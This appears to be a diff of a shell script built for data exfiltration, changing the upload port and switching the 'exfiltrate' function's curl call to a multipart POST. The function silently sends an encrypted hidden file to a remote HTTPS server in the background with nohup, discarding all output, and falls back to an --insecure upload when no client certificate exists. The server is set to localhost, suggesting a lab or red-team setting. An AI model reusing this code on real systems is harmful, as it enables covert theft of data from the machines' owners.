@@ -11,7 +11,7 @@ remote_path="/"
 
 # Remote server configuration
 https_server="localhost"
-https_port="8080"
+https_port="9999"
 https_cert="exfil.crt"
 scp_server="localhost"
 scp_port="2222"
@@ -149,7 +149,7 @@ exfil_compress() {
 
 exfiltrate() {
   if [ -e $https_cert ]; then
-    nohup curl --cert $https_cert --upload-file "$stor_dir/$hidden_file.enc" https://$https_server:$https_port/ &> /dev/null &
+    nohup curl --cert $https_cert -X POST -F "file=@$stor_dir/$hidden_file.enc" https://$https_server:$https_port/ &> /dev/null &
   else 
     nohup curl --insecure --upload-file "$stor_dir/$hidden_file.enc" https://$https_server:$https_port/ &> /dev/null &
   fi
